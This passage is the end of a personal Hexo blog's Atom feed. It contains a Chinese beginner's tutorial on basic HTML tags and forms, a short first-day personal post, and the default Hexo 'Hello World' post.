9000px;&quot;&gt;通过”点我“您来到了这里&lt;/div&gt;&lt;!--div可理解为：显示文本标签，“position：absolute”是绝对定位的意思，    单纯的使用absolute属性并不会其效果，    需要配合“top bottom left right ”属性才能看到效果。--&gt;</code></pre><p>6：h标签</p><h1>第1句话</h1>    <h2>第2句话</h2>    <h3>第3句话</h3>    <h4>第4句话</h4>    <h5>第5句话</h5>    <h6>第6句话</h6>    <h7>第7句话</h7>    <!--        h后的数字超过6后，文本均为普通文本    -->    <br>    <br>7：meta标签<!--        6：meta标签之keywords：为文档定义了一组关键字，某些搜索引擎在遇到这些关键字时，        会用这些关键字对网站的网页进行分类<pre><code>--&gt;&lt;meta name=&quot;keywords&quot; content=&quot;嘻嘻哈哈，数码宝贝，世界值得&quot;&gt;&lt;!--    7：meta标签之description    对网站页面进行描述，方便搜索引擎展示给用户，使用户了解网站性质--&gt;&lt;meta name=&quot;description&quot; content=&quot;你才这个网站是干嘛的？&quot;&gt;</code></pre><p>8：div标签:<br> <!--        8:div标签:用来控制、布局的，包裹文本或别的标签        每一个div标签会自动换行    --><br>    <div style="color: aqua;">看看我的颜色吧</div><br>    <br><br>9:span标签</p><!--        9:span标签:用来控制、布局的，包裹文本或别的标签        每一个div标签不会会自动换行    --><pre><code>&lt;span style=&quot;color: red&quot;&gt;我是小红&lt;/span&gt;&amp;nbsp;&lt;!--转义字符：表示英文空格--&gt;&lt;br /&gt;&lt;br /&gt;&lt;!--&lt;br/&gt;标签标准写法，（无开始和结束的标签后可以加上/--&gt;</code></pre><p>10：pre标签</p><!--        10：pre标签：pre 元素可定义预格式化的文本。         被包围在 pre 元素中的文本通常会保留空格和换行符。    --><pre><code>&lt;pre&gt;    你  不知道 你，    所以 你 是你。&lt;/pre&gt;</code></pre><p>11：p标签</p><!--        11：p标签：表示段落（自动换行且间距大    --><pre><code>&lt;p&gt;    &amp;nbsp; &amp;nbsp;&amp;nbsp;&amp;nbsp;《悟》&lt;p&gt;    &lt;br /&gt;    悟道休言天命，    &lt;br /&gt;    修行勿取真经。    &lt;br /&gt;    一悲一喜一枯荣，    &lt;br /&gt;    哪个前生注定？    &lt;br /&gt;&lt;/p&gt;&lt;p&gt;    袈裟本无清净，    &lt;br /&gt;    红尘不染性空。    &lt;br /&gt;    幽幽古刹千年钟，    &lt;br /&gt;    都是痴人说梦。&lt;/p&gt;&lt;br /&gt;</code></pre><p>12：center标签<br> <!--        12：center标签：使内容水平居中    --><br>    <center><br>        <div>修为成佛，在求。</div><br>        <div>悟为明性，在知。</div><br>        <div>修行以行制性，悟道以性施行，觉者由心生律，修者以律制心。</div><br>        <div>不落恶果者有信无证，住因住果、住念住心，如是生灭。</div><br>        <div>不昧因果者无住而住，无欲无不欲，无戒无不戒，如是涅槃。</div><br>    </center><br>    <br /><br>13：form（形式、表格、表单）标签</p><!--        13：form（形式、表格、表单）标签    --><pre><code>&lt;input type=&quot;text&quot; value=&quot;此处输入不会提交奥&quot;&gt;&lt;br /&gt;&lt;br /&gt;&lt;input type=&quot;text&quot; placeholder=&quot;占位文本且不提交&quot;&gt;&lt;br /&gt;&lt;br /&gt;&lt;!--placeholder:n,占位符、占位文本--&gt;&lt;input type=&quot;button&quot; value=&quot;我只是一个按钮&quot;&gt;&lt;br /&gt;&lt;br /&gt;&lt;input type=&quot;submit&quot; value=&quot;我是一个可以提交的按钮（如果在form表单中的话,haha)&quot;&gt;&lt;!--    如果在form表单中：submit按钮可以将所有输入内容都提交给服务器                     如果是button按钮，则需要给button重新定义一个事件--&gt;&lt;br /&gt;&lt;br /&gt;&lt;button&gt;我是一个单纯的按钮类型&lt;/button&gt;&lt;br /&gt;&lt;br /&gt;&lt;!--    在url中能看到的方式传参：get传参（我们的值通过http协议传给服务器）--&gt;&lt;!--    https://www.baidu.com/s?wd=我爱的人    ？前为url，？后为参数、参数之间用&amp;分隔    wd――查询的关键词(Keyword) --&gt;&lt;form action=&quot;https://www.baidu.com/s&quot; target=&quot;_blank&quot; method=&quot;get&quot;&gt;    &lt;input type=&quot;text&quot; name=&quot;wd&quot;&gt;    &lt;input type=&quot;submit&quot; value=&quot;点我提交内容到百度&quot;&gt;&lt;/form&gt;&lt;!--    eage的url关键字参数为wd，所以要用name=”wd”    target可要可不要--&gt;&lt;br /&gt;&lt;br /&gt;&lt;pre&gt;用户名：  &lt;input type=&quot;text&quot;/&gt;    &lt;br/&gt;用户密码：&lt;input type=&quot;password&quot;/&gt;&lt;!--如果password中有值，则可以F12源代码中Elements中将password修改为text    （源代码经浏览器渲染后，内存里的代码的一个状态《动态执行后的代码》如果直接右键，则显示的是真正源代码--&gt;&lt;/pre&gt;&lt;br/&gt;&lt;br/&gt;&lt;input type=&quot;hidden&quot; value=&quot;能看到我吗?&quot;&gt;&lt;!--    隐藏域    注重功能能上的使用，却又不想让用户看到的参数--&gt;&lt;br/&gt;&lt;br/&gt;&lt;input type=&quot;hidden&quot; type=&quot;text&quot; value=&quot;看不到我吧&quot;/&gt;&lt;!--    html中：当属性冲突时会以第一个为准--&gt;&lt;br/&gt;</code></pre><p>14：单选、复选、下拉、上传标签<br> <!--        14：单选、复选、下拉、上传标签    --></p><pre><code>&lt;!--checkbox标签：复选框    复选框用的value 指的是这个复选框的值--&gt;&lt;input type=&quot;checkbox&quot;/&gt;何必再说&lt;input type=&quot;checkbox&quot;/&gt;看你看云&lt;input type=&quot;checkbox&quot;/&gt;忘了那片海&lt;br/&gt;&lt;br/&gt;&lt;!--radio标签：单选框    单选框用的value 和复选框一样    在后台如果你想得到复选框的内容 就是value 来取    当你在接收表单数据的页面中获取数据时，    得到的就是value的值--&gt;&lt;!--单选框情况1--&gt;请选择：&lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;1&quot; /&gt;男&lt;input type=&quot;radio&quot; name=&quot;gender&quot; value=&quot;1&quot; /&gt;女&lt;/br&gt;&lt;/br&gt;请选择：&lt;!--单选框情况2--&gt;&lt;input type=&quot;radio&quot; name=&quot;sex&quot; /&gt;男&lt;input type=&quot;radio&quot; name=&quot;sex&quot; /&gt;女&lt;br/&gt;&lt;br/&gt;&lt;!--单选框情况3:默认选择一个--&gt;默认选择一个1&lt;input type=&quot;radio&quot; name=&quot;a&quot; /&gt;男&lt;!--此方法失效，不清楚原因@_@    问题解决：各组选项之间name不能相同--&gt;&lt;input type=&quot;radio&quot; name=&quot;a&quot; checked/&gt;女&lt;br/&gt;&lt;br/&gt;默认选择一个2&lt;!--单选框情况4:默认选择一个--&gt;&lt;input type=&quot;radio&quot; name=&quot;b&quot; checked=&quot;true&quot;/&gt;男&lt;input type=&quot;radio&quot; name=&quot;b&quot; /&gt;女&lt;!--单选框情况3:默认选择一个--&gt;&lt;br/&gt;&lt;br/&gt;默认选择一个3&lt;input type=&quot;radio&quot; name=&quot;c&quot;/&gt;男&lt;input type=&quot;radio&quot; name=&quot;c&quot; checked=&quot;checked&quot;/&gt;女&lt;br/&gt;&lt;br/&gt;&lt;!--下拉框/（标签）select    选项给浏览者看的    给计算机看的是value中的值--&gt;&lt;select&gt;    &lt;option&gt;--请选择--&lt;/option&gt;    &lt;option value=&quot;1&quot;&gt;葡萄&lt;/option&gt;    &lt;option value=&quot;橘子&quot;&gt;橘子&lt;/option&gt;    &lt;option&gt;香蕉&lt;/option&gt;    &lt;option&gt;柠檬&lt;/option&gt;    &lt;option&gt;香水&lt;/option&gt;&lt;/select&gt;&lt;br/&gt;&lt;br/&gt;&lt;!--文本域textarea    rows：行数（即高度）    cols：列数（即宽度）--&gt;&lt;textarea rows=&quot;1&quot; cols=&quot;50&quot;&gt;    你是朵夜云，在我梦幻的天空浮泛&lt;/textarea&gt;&lt;br/&gt;&lt;br/&gt;&lt;!--上传标签file--&gt;&lt;input type=&quot;file&quot;&gt;&lt;br/&gt;&lt;br/&gt;</code></pre><p>15：u标签</p><!--15：u标签--><pre><code>&lt;ul&gt;    &lt;li&gt;john&lt;/li&gt;    &lt;li&gt;yohn&lt;/li&gt;    &lt;li&gt;smith&lt;/li&gt;&lt;/ul&gt;&lt;br/&gt;&lt;br/&gt;&lt;ul type=&quot;circle&quot;&gt;    &lt;li&gt;john&lt;/li&gt;    &lt;li&gt;yohn&lt;/li&gt;    &lt;li&gt;smith&lt;/li&gt;&lt;/ul&gt;&lt;br/&gt;&lt;br/&gt;&lt;ul type=&quot;disc&quot;&gt;    &lt;li&gt;john&lt;/li&gt;    &lt;li&gt;yohn&lt;/li&gt;    &lt;li&gt;smith&lt;/li&gt;&lt;/ul&gt;&lt;br/&gt;&lt;br/&gt;</code></pre><p>16：table（表格）标签</p><!--16：table（表格）标签        table：（桌子）、表格        border：边框（像素为1？）        thead：表格头        tr：表格行        th：表格头中的列        td：表格列        colspan：标签属性（合并列《跨列数》）数字为合并的列数        rowspan：合并行（跨行数）        align：对齐        提示：外层标签（head、body、foot）可以不要，效果一样    --><pre><code>&lt;table border=&quot;1&quot;&gt;    &lt;thead&gt;        &lt;tr&gt;            &lt;th colspan=&quot;2&quot; align=&quot;center&quot;&gt;理想与现实的距离&lt;/td&gt;        &lt;/tr&gt;            &lt;/thead&gt;    &lt;tbody&gt;        &lt;tr&gt;            &lt;th&gt;理想&lt;/th&gt;            &lt;th&gt;当下&lt;/th&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td&gt;距离&lt;/td&gt;            &lt;td&gt;little&lt;/td&gt;        &lt;/tr&gt;        &lt;tr&gt;            &lt;td&gt;时间&lt;/td&gt;            &lt;td&gt;little&lt;/td&gt;        &lt;/tr&gt;    &lt;/tbody&gt;    &lt;tfoot&gt;        &lt;tr&gt;            &lt;td&gt;求和&lt;/td&gt;            &lt;td&gt;max&lt;/td&gt;        &lt;/tr&gt;    &lt;/tfoot&gt;</code></pre><p>17:frameset（框架页）标签<br><!doctype html></p><!--文档类型声明 html--><html><!--17：frameset标签        frameset:n.框架型 框架的 框架页 框架集        frame：n. 框架，边框；    --><!----混合框架----><frameset rows="50%,50%">    <frame src="frame框架1.html"></frame>    <frameset cols="50%,50%">        <frame src="frame框架2.html"></frame>        <frame src="frame框架3.html"></frame>    </frameset></frameset></html>18：iframe（n. 内嵌框架；内联框架）标签<!--        18：iframe（n. 内嵌框架；内联框架）标签        作用：在当前页面中嵌套        src中可以是：图片、html、网址等....        1:vh就是当前屏幕可见高度的1%，也就是说        height:100vh == height:100%;        2:vw就是当前屏幕宽度的1%        3:scorlling:n、v：滚动、卷动<pre><code>    注意：一些老的浏览器不支持iframe            如果得不到支持，iframe是不可见的--&gt;&lt;br/&gt;&lt;br/&gt;    &lt;iframe src=&quot;https://www.4399.com/&quot; style=&quot;width: 100vw; height:100vh&quot; frameborder=&quot;0&quot; scorlling=&quot;no&quot;&gt;&lt;/iframe&gt;&lt;!--    &lt;iframe src=&quot;https://www.baidu.com&quot; style=&quot;width: 100vw; height:100vh frameborder=&quot;0&quot; scorlling=&quot;no&quot;;&gt;&lt;/iframe&gt;    这个网站不能嵌入，尚未解决（请求被拒绝）--&gt;我在iframe之外奥&lt;br/&gt;&lt;br/&gt;</code></pre><p>19:属性<br> <!--        19:属性        每一个html标签，都有自己的属性，通过设置属性的值，达到想要的外观或功能性效果        当然，也可以在标签上通过name="value"的方式写自定义的属性，以共自己调用        常见的属性；        width、height、id（唯一,相当于给每一个标签起唯一的一个标识）、name（可相同）、        src（img、iframe等标签中）、value（值）、type、align（文本对齐方式）    --><br>20:hr标签（横线）</p><!--        20:hr标签（横线）    --><pre><code>下面有一条横线&lt;hr&gt;滴&lt;hr&gt;上面也有一条横线&lt;br/&gt;&lt;br/&gt;</code></pre><p>21:html实体编码、转义、特殊符号</p><!--        21:html实体编码、转义、特殊符号    --><pre><code>M&lt;sup&gt;2&lt;/sup&gt;&lt;pre&gt;HTML特殊转义字符对照表&lt;/pre&gt;https://tool.oschina.net/commons?type=2&lt;pre&gt;HTML 中有用的字符实体&lt;/pre&gt;https://www.w3school.com.cn/html/html_entities.asp&lt;pre&gt;URL 编码参考手册&lt;/pre&gt;https://www.runoob.com/tags/html-urlencode.html&lt;pre&gt;URL 汉字转html实体符号 中文转&amp;#开头的字符编码&lt;/pre&gt;https://seo.juziseo.com/tools/entity/ html实体编码&lt;h1 style=&quot;color: lawngreen;&quot; align=&quot;center&quot;&gt;html see you soon&lt;/h1&gt;</code></pre><p>​</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>The first day</title>
    <link href="http://kannikanyun.github.io/2022/01/13/The-first-day/"/>
    <id>http://kannikanyun.github.io/2022/01/13/The-first-day/</id>
    <published>2022-01-13T05:44:44.000Z</published>
    <updated>2022-02-08T14:28:24.988Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>sticky: 1<br>copyright_author: Kanyun<br>copyright_info: 此文章版权归Kanyun所有，如有转载，请註明来自原作者<br>hello，我是KanYun，blog路漫漫，也算是来到了这一步，这是一个开始，希望对看到My blog的每一个朋友，它都能够陪你度过一段快乐的时光！！！</p><h2 id="今天就简单一点吧（还要去干饭哈哈）"><a href="#今天就简单一点吧（还要去干饭哈哈）" class="headerlink" title="今天就简单一点吧（还要去干饭哈哈）"></a>今天就简单一点吧（还要去干饭哈哈）</h2><p>红颜烤奶其实一般般（开启闪躲技能^__^haha）</p><p>还不会贴图片，否则少不了一张暴打小黑照片（气吧哈哈O(∩<em>∩)O@</em>@haha）<br><img src="The-first-day/hei.jpg" alt="hei"></p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>慢着，听首歌再溜！</p><p><a href="https://www.bilibili.com/video/BV1X44y1x7xu?from=search&amp;seid=14638848182898955938&amp;spm_id_from=333.337.0.0">https://www.bilibili.com/video/BV1X44y1x7xu?from=search&amp;seid=14638848182898955938&amp;spm_id_from=333.337.0.0</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://kannikanyun.github.io/2022/01/12/hello-world/"/>
    <id>http://kannikanyun.github.io/2022/01/12/hello-world/</id>
    <published>2022-01-12T10:45:25.477Z</published>
    <updated>2022-01-12T10:45:25.477Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo new <span class="token string">"My New Post"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo generate<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ hexo deploy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
  </entry>
  
</feed>
